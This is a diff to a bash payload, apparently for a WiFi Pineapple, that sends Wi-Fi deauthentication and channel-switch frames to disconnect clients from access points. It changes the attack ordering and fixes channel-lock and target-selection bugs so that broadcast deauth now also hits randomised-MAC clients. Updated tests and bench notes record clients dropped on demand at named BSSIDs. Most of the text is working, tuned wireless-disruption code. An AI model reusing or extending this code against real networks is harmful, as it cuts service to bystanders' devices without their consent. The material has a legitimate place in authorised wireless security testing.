@@ -632,9 +632,12 @@ attack_scope() {
 posture_opts() {
   case "$1" in
     'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
-    'C')            printf 'CSA BOTH DEAUTH' ;;  # PMF required: deauth is ignored but stays offered
-    '?')            printf 'CSA BOTH DEAUTH' ;;  # posture unread: CSA lands on every badge but NONE
-    *)              printf 'BOTH DEAUTH CSA' ;;
+    # DEAUTH leads on every remaining badge, and the badge no longer changes the order, because on
+    # 1.1.3 it is the ONLY key that reaches the air at all -- see posture_expect for the parse path
+    # that kills the other two. The ordering used to lead CSA under PMF, which preselected a key
+    # that provably transmits nothing. BOTH and CSA stay offered: the operator asked for them, and
+    # a firmware that fixes _ALL would make them live again without a code change here.
+    *)              printf 'DEAUTH BOTH CSA' ;;
   esac
 }
 
@@ -643,10 +646,26 @@ posture_opts() {
 posture_expect() {
   local b="$1" k="$2"
   [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
+  [ "$b" = NONE ]  && { printf 'blocked'; return 0; }
+  # CSA and BOTH transmit NOTHING on this firmware, whatever the beacon says, so the badge cannot
+  # speak for them. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
+  # fc:58:5a:08:42:15 ch 8, PINEAPPLE_DEAUTH_CLIENT with ff:ff:ff:ff:ff:ff dropped a client on
+  # demand while PINEAPPLE_DEAUTH_CLIENT_ALL with that SAME address, minutes later, did nothing --
+  # one address, one channel, one BSSID, two opcodes, two outcomes. The mechanism is NOT settled:
+  # pineapd runs one handler that dispatches on a numeric opcode (400 deauth, 401 deauth+CSA, 402
+  # CSA) and _ALL's deauth half reaches the same instruction with the same arguments as the call
+  # that works, because StartDeauthAll writes sta = ff:ff:ff:ff:ff:ff by immediate. The leading
+  # hypothesis is that inject_csa's set_and_freeze_primary_channel_hop_s retunes the radio between
+  # inject_deauth's enqueue and the injection handler's transmit. CLAUDE.md "Third contact" has the
+  # addresses and the one-command test. CSA additionally carries Channel Switch Count 0 AND a
+  # hardcoded New Channel Number of 14 (Japan-only), either of which alone would stop a US client
+  # acting on it. hak5cmd exits 0 and prints nothing on every path, so none of this is visible
+  # above the socket -- which is exactly why the operator needs the label.
+  # Falsified by: _ALL or _CSA disconnecting any client, on any firmware, from any caller.
+  case "$k" in CSA|BOTH) printf 'fw-broken'; return 0 ;; esac
   [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
   case "$k" in
     DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
-    CSA|BOTH)    case "$b" in 'NONE') printf 'blocked' ;; *) printf 'works' ;; esac ;;
     *)           printf 'unknown' ;;
   esac
 }
@@ -2056,6 +2075,14 @@ lock_target() {   # lock_target <bssid> <secs> [channel]; the channel defaults t
   # reached the operator. Proceeding is still right -- the alternative is refusing every response
   # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
   [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back, lock unverified"; return 3; }
+  # A transient unreadable sample is not evidence of hopping. Measured on the bench 2026-11-09:
+  # c1 came back EMPTY while c2 and c3 both read 1 and the target channel WAS 1 -- the radio was
+  # parked exactly where it was asked to be -- yet the all-three-equal test below scored that
+  # "still hopping (/1/1)", returned 2, and refused the whole response (loot row LOCK_FAILED on
+  # 50:92:6a:ae:a8:82). cur_channel returns empty on a read it cannot parse, which is a missing
+  # sample, not a different channel; compare only the samples we actually got.
+  [ -z "$c1" ] && c1="$c2"
+  [ -z "$c2" ] && c2="$c3"
   if [ "$c1" = "$c2" ] && [ "$c2" = "$c3" ]; then
     [ "$c3" = "$want" ] || [ "$want" = 0 ] && return 0
     PINEAPPLE_EXAMINE_CHANNEL "$want" "$secs" >/dev/null 2>&1; sleep 1; c3=$(cur_channel)
@@ -2545,7 +2572,7 @@ resp_aggregate() {
 
 resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
   local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
-  local scope tgt_verdict=- cap_secs lock_secs t_cap why frc ferr
+  local scope tgt_verdict=- cap_secs lock_secs t_cap why frc ferr nmeas=0
   local -a subjects=(); local -A P0=() T0=()
   RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
   cmd=$(response_cmd "$k")
@@ -2603,19 +2630,35 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   fi
   resp_snapshot "$scope"
   for m in "${!RS_PK[@]}"; do subjects+=("$m"); P0[$m]="${RS_PK[$m]}"; T0[$m]="${RS_T[$m]}"; done
+  nmeas=${#subjects[@]}      # of the subjects, how many Recon can actually score
   if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then
-    if (( ${#subjects[@]} == 0 )); then                        # nothing to disconnect, nothing to measure
+    # A heard station is a TARGET even when it is not a SUBJECT, and conflating the two was a real
+    # defect: measuring a device needs a Recon row and an address stable enough to compare across
+    # the fire, but TRANSMITTING at it needs neither -- the frame carries an address, not a
+    # baseline. Until 2026-11-09 `subjects` was both sets at once, so an AP whose only client was a
+    # randomised-MAC phone refused with NO_MATCH and sent NOTHING. Measured on the bench, seven
+    # consecutive attempts on fc:58:5a:08:42:15: `resp members ... n=1 why=ok ... recs=286..468`
+    # (the capture heard the station, zero short/trunc/runt) followed by `refused ... NO_MATCH
+    # members=1`, with pk_before and pk_after both '-' in every loot row -- while the GUI's AP-row
+    # deauth, which is the SAME opcode-400 broadcast frame this function would have sent, dropped
+    # that client on demand. The measurement gate was gating the transmit.
+    # These members get p0 '-', so resp_verdict returns INCONCLUSIVE for them rather than inventing
+    # a verdict -- the honest answer for a device we disconnected but cannot score.
+    if [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ]; then
+      for m in "${!RESP_MEMBERS[@]}"; do
+        [ "$m" = ff:ff:ff:ff:ff:ff ] && continue
+        [ -n "${P0[$m]+x}" ] && continue          # already a measurable subject
+        subjects+=("$m"); P0[$m]=-; T0[$m]=-
+      done
+    fi
+    if (( ${#subjects[@]} == 0 )); then     # heard nobody AND can measure nobody: nothing to aim at
       unlock_target                      # every refusal past the lock must release it, or a leaked
       log resp "unlocked after refusal"  # EXAMINE pins the radio off its hop cycle for the run
       if [ -n "$MEMBERS_WHY" ]; then
         why="$MEMBERS_WHY"; LOG red "$MEMBERS_TEXT"
-      elif (( ${#RESP_MEMBERS[@]} > 0 )); then
-        # Heard stations, but not one survived Recon and the randomised-MAC gate. Saying "no
-        # clients" here would be a lie about a BSS we demonstrably heard traffic on, and it would
-        # send the operator to look for a dead AP instead of at the gate that dropped them.
-        why=NO_MATCH
-        LOG red "heard ${#RESP_MEMBERS[@]} on ${R_BSSID:9} but none is measurable: no Recon row, or randomised"
       else
+        # Reachable only if a membership set was gathered for a DIFFERENT BSSID, which resp_fire's
+        # entry reset should prevent; kept as a guard rather than a claim about the air.
         why=NO_CLIENTS; LOG red "no visible clients on ${R_BSSID:9}: nothing to disconnect"
       fi
       log resp "refused $R_BSSID $why members=${#RESP_MEMBERS[@]} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT"
@@ -2629,7 +2672,7 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   [ "$lock" = unverified ] && LOG yellow "$LOCK_TEXT"
   set_state RESPOND
   LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
-  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n"
+  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n measurable=$nmeas heard=${#RESP_MEMBERS[@]}"
   # Capture the command's rc AND its stderr. Discarding both was a real defect: if the firmware
   # refuses the command nothing leaves the radio, yet the loot row still read NO_EFFECT (subjects
   # kept transmitting) or MOVED (a counter happened to stall) -- indistinguishable from a real
@@ -3246,11 +3289,11 @@ IWFIX
   st "cmd CSA"     "$(response_cmd CSA)"    "PINEAPPLE_DEAUTH_CLIENT_CSA"
   st "cmd BOTH"    "$(response_cmd BOTH)"   "PINEAPPLE_DEAUTH_CLIENT_ALL"
   st "cmd unknown is empty" "$(response_cmd WAT)" ""
-  st "opts no PMF prefers BOTH"   "$(posture_opts 'D+C')"  "BOTH DEAUTH CSA"
-  st "opts PMF required leads CSA" "$(posture_opts C)"     "CSA BOTH DEAUTH"
+  st "opts no PMF leads DEAUTH"    "$(posture_opts 'D+C')" "DEAUTH BOTH CSA"
+  st "opts PMF required leads DEAUTH" "$(posture_opts C)"  "DEAUTH BOTH CSA"
   st "opts beacon prot offers none" "$(posture_opts NONE)" ""
   st "opts no-inject offers none"  "$(posture_opts NOINJ)" ""
-  st "opts unread leads CSA"       "$(posture_opts '?')"   "CSA BOTH DEAUTH"
+  st "opts unread leads DEAUTH"    "$(posture_opts '?')"   "DEAUTH BOTH CSA"
 
   # The shipped default is recon+response. A silent revert to 0 would disarm the rung with no
   # other symptom, so pin it here rather than trusting the config block to stay put.
@@ -3269,7 +3312,12 @@ IWFIX
   st "expect deauth vs no PMF"     "$(posture_expect 'D+C' DEAUTH)"  "works"
   st "expect deauth vs optional PMF" "$(posture_expect 'D?+C' DEAUTH)" "partial"
   st "expect deauth vs required PMF" "$(posture_expect C DEAUTH)"    "blocked"
-  st "expect csa vs required PMF"  "$(posture_expect C CSA)"         "works"
+  # CSA and BOTH cannot transmit on 1.1.3 at all (pineapd throws on a missing 'sta' before the
+  # opcode dispatch), so the badge never speaks for them -- except where the radio or the crypto
+  # rules them out first, which stays the stronger answer.
+  st "expect csa is fw-broken"     "$(posture_expect C CSA)"         "fw-broken"
+  st "expect both is fw-broken"    "$(posture_expect 'D+C' BOTH)"    "fw-broken"
+  st "expect csa on NOINJ is still blocked" "$(posture_expect NOINJ BOTH)" "blocked"
   st "expect csa vs beacon prot"   "$(posture_expect NONE CSA)"      "blocked"
   st "expect both vs beacon prot"  "$(posture_expect NONE BOTH)"     "blocked"
   st "expect anything on NOINJ"    "$(posture_expect NOINJ CSA)"     "blocked"
@@ -3343,6 +3391,21 @@ IWFIX
   lock_target aa:00:00:00:00:10 5 6 >/dev/null
   st "lock_target: no read-back is rc 3, not a verified lock"  "$?" 3
   st "lock_target: and it says the lock is unverified" "$(printf '%s' "$LOCK_TEXT" | grep -c unverified)" "1"
+  # A transient unreadable sample is not a different channel. Measured on the bench 2026-11-09:
+  # cur_channel returned empty, then 1, then 1, against a target channel of 1 -- the radio WAS
+  # parked where it was asked to be -- and the all-three-equal test scored that "still hopping
+  # (/1/1)", returned 2 and refused the whole response (loot row LOCK_FAILED on 50:92:6a:ae:a8:82).
+  # The counter lives in a file because cur_channel runs iwinfo inside $( ), so a variable
+  # incremented in the stub would die with the subshell and every sample would read the same.
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" -gt 1 ] && printf '          Channel: 1 (2.412 GHz)\n'; return 0; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: an empty first sample is not 'still hopping'" "$?" 0
+  : >"$tmp/chseq"
+  iwinfo() { printf 'x' >>"$tmp/chseq"; printf '          Channel: %s (2.412 GHz)\n' "$(wc -c <"$tmp/chseq" | tr -d ' ')"; }
+  lock_target aa:00:00:00:00:10 5 1 >/dev/null
+  st "lock_target: samples that really differ are still a failed lock" "$?" 2
+  iwinfo() { :; }
   unset -f iwinfo iw; PINEAPPLE_EXAMINE_BSSID() { :; }; PINEAPPLE_EXAMINE_CHANNEL() { :; }   # restore the base stubs; unsetting them would expose the real ones
   st "disrupt row shows cached badge" "$(disrupt_row aa:00:00:00:00:10)" "Disrupt [C]"
   # :13 is the CH=0 fixture the line above asserts resp_target refuses. It used to render a plain
